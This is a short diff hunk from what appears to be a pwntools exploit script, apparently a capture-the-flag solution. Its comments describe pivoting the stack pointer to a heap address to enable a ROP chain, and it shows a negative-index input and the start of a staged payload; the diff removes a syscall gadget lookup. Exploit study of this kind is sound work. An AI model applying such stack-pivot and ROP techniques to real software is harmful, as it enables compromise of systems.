@@ -37,7 +37,6 @@ def main():
     # When the training() returns, $rsp will be changed to this heap address. (mov rsp, rbp; pop rbp; ret)
     # Thus we control the whole function stack frame, making ROP feasible.
     rop = ROP(e)
-    syscall = rop.find_gadget(['syscall', 'ret'])[0]
     r.sendlineafter(b':', b'-2')
     head_buff_size = 8
     stage_1 = flat(
